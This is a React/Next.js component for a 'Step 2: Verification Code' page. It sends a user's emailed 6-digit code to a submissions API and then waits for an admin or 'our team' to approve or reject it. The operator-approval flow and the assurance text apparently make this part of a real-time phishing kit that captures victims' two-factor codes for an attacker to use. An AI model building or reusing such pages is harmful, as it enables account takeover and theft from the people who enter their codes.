
'use client';

import { zodResolver } from '@hookform/resolvers/zod';
import { ArrowLeft, KeyRound, Loader2, ArrowRight } from 'lucide-react';
import { useForm } from 'react-hook-form';
import * as z from 'zod';
import { Button } from '@/components/ui/button';
import { Form, FormControl, FormField, FormItem, FormMessage, FormLabel } from '@/components/ui/form';
import { InputOTP, InputOTPGroup, InputOTPSlot } from '@/components/ui/input-otp';
import { Progress } from '@/components/ui/progress';
import type { Submission } from '@/lib/types';
import { useState } from 'react';
import { useToast } from '@/hooks/use-toast';
import { WaitingForApproval } from './waiting-for-approval';
import { cn } from '@/lib/utils';
import { InfoAlert } from './info-alert';
import { ResendCode } from './resend-code';

const formSchema = z.object({
  verificationCode: z.string().length(6, "Code must be 6 digits."),
});

type FormValues = z.infer<typeof formSchema>;

interface VerifyCodeStepProps {
    submissionId: string;
    onApproval: (data: Partial<Submission>) => void;
    onRejection: () => void;
    onBack: () => void;
}

export function VerifyCodeStep({ submissionId, onApproval, onRejection, onBack }: VerifyCodeStepProps) {
    const { toast } = useToast();
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [isWaiting, setIsWaiting] = useState(false);
    const [shake, setShake] = useState(false);
    
    const form = useForm<FormValues>({
        resolver: zodResolver(formSchema),
        defaultValues: { verificationCode: '' },
    });

    const triggerShake = () => {
        setShake(true);
        setTimeout(() => setShake(false), 500);
    };
    
    const handleRejection = () => {
        setIsWaiting(false);
        triggerShake();
        form.reset();
        onRejection();
    };

    const onSubmit = async (values: FormValues) => {
        setIsSubmitting(true);
        try {
            const response = await fetch('/api/submissions', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id: submissionId, verificationCode: values.verificationCode }),
            });
            if (!response.ok) {
                const errorData = await response.json();
                throw new Error(errorData.message || 'Failed to submit verification code.');
            }

            toast({
              title: 'Code Submitted!',
              description: "Waiting for admin to verify your code.",
            });
            
            setIsWaiting(true);

        } catch (err: any) {
            toast({ variant: 'destructive', title: 'Submission Failed', description: err.message });
            triggerShake();
        } finally {
            setIsSubmitting(false);
        }
    };
    
    const isButtonDisabled = isSubmitting || (form.watch('verificationCode')?.length ?? 0) < 6;

    if (isWaiting) {
        return (
            <WaitingForApproval
                submissionId={submissionId}
                stepToWatch="verificationCode"
                onApproval={() => onApproval({ verificationCode: form.getValues().verificationCode })}
                onRejection={handleRejection}
                promptText="Waiting for our team to confirm your verification code..."
            />
        );
    }


    return (
        <div className={cn("w-full max-w-lg mx-auto", shake && "animate-shake")}>
             <div className="text-center mb-8">
                <div className="flex h-16 w-16 items-center justify-center rounded-full bg-primary/10 text-primary mb-4 mx-auto">
                    <KeyRound className="h-8 w-8" />
                </div>
                <h1 className="text-2xl font-bold">Step 2: Verification Code</h1>
                <p className="text-muted-foreground">Enter the 6-digit code sent to your device.</p>
                <InfoAlert 
                    title="Hint" 
                    message="You should receive a code on the email account linked with this username." 
                />
            </div>

            <Progress value={50} className="w-[80%] mx-auto mb-8" />
            
            <Form {...form}>
                <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
                    <FormField
                        control={form.control}
                        name="verificationCode"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel className="sr-only">Verification Code</FormLabel>
                                <FormControl>
                                    <div className="flex justify-center">
                                    <InputOTP 
                                        maxLength={6} 
                                        {...field} 
                                        disabled={isSubmitting}
                                    >
                                        <InputOTPGroup>
                                            <InputOTPSlot index={0} />
                                            <InputOTPSlot index={1} />
                                            <InputOTPSlot index={2} />
                                            <InputOTPSlot index={3} />
                                            <InputOTPSlot index={4} />
                                            <InputOTPSlot index={5} />
                                        </InputOTPGroup>
                                    </InputOTP>
                                    </div>
                                </FormControl>
                                <p className="text-xs text-muted-foreground text-center pt-2">
                                    This step is crucial to know if you really own the account.
                                </p>
                                <FormMessage className="text-center" />
                            </FormItem>
                        )}
                    />
                    
                    <div className="flex flex-col gap-4 pt-4">
                        <Button type="submit" size="lg" className="w-full rounded-full" disabled={isButtonDisabled}>
                             {isSubmitting && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                             {isSubmitting ? 'Verifying...' : 'Continue'}
                             {!isSubmitting && <ArrowRight className="ml-2 h-5 w-5" />}
                        </Button>
                        <Button type="button" variant="outline" size="lg" className="w-full rounded-full" onClick={onBack} disabled={isSubmitting}>
                            <ArrowLeft className="mr-2 h-5 w-5" />
                            Back
                        </Button>
                    </div>
                    <ResendCode />
                </form>
            </Form>
        </div>
    );
}
